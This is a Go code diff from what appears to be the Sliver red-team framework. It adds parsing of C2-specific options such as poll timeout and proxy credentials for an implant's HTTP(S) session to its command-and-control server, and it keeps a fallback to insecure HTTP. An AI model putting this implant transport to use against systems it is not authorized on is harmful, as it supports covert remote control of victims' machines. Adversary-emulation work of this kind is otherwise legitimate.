@@ -59,10 +59,36 @@ var (
 	ErrStatusCodeUnexpected = errors.New("unexpected http response code")
 )
 
+// HTTPOptions - c2 specific configuration options
+type HTTPOptions struct {
+	PollTimeout time.Duration
+
+	ProxyConfig   string
+	ProxyUsername string
+	ProxyPassword string
+}
+
+// ParseHTTPOptions - Parse c2 specific configuration options
+func ParseHTTPOptions(c2URI *url.URL) *HTTPOptions {
+	pollTimeout, err := time.ParseDuration(c2URI.Query().Get("poll-timeout"))
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("Failed to parse poll-timeout %s", err)
+		// {{end}}
+		pollTimeout = time.Duration(30 * time.Second)
+	}
+	return &HTTPOptions{
+		PollTimeout:   pollTimeout,
+		ProxyConfig:   c2URI.Query().Get("proxy"),
+		ProxyUsername: c2URI.Query().Get("proxy-username"),
+		ProxyPassword: c2URI.Query().Get("proxy-password"),
+	}
+}
+
 // HTTPStartSession - Attempts to start a session with a given address
-func HTTPStartSession(address string, pathPrefix string, timeout time.Duration, proxyConfig string) (*SliverHTTPClient, error) {
+func HTTPStartSession(address string, pathPrefix string, opts *HTTPOptions) (*SliverHTTPClient, error) {
 	var client *SliverHTTPClient
-	client = httpsClient(address, timeout, proxyConfig)
+	client = httpsClient(address, opts.PollTimeout, opts.ProxyConfig)
 	client.PathPrefix = pathPrefix
 	err := client.SessionInit()
 	if err != nil {
@@ -70,7 +96,7 @@ func HTTPStartSession(address string, pathPrefix string, timeout time.Duration, 
 		if strings.HasSuffix(address, ":443") {
 			address = fmt.Sprintf("%s:80", address[:len(address)-4])
 		}
-		client = httpClient(address, timeout, proxyConfig) // Fallback to insecure HTTP
+		client = httpClient(address, opts.PollTimeout, opts.ProxyConfig) // Fallback to insecure HTTP
 		err = client.SessionInit()
 		if err != nil {
 			return nil, err
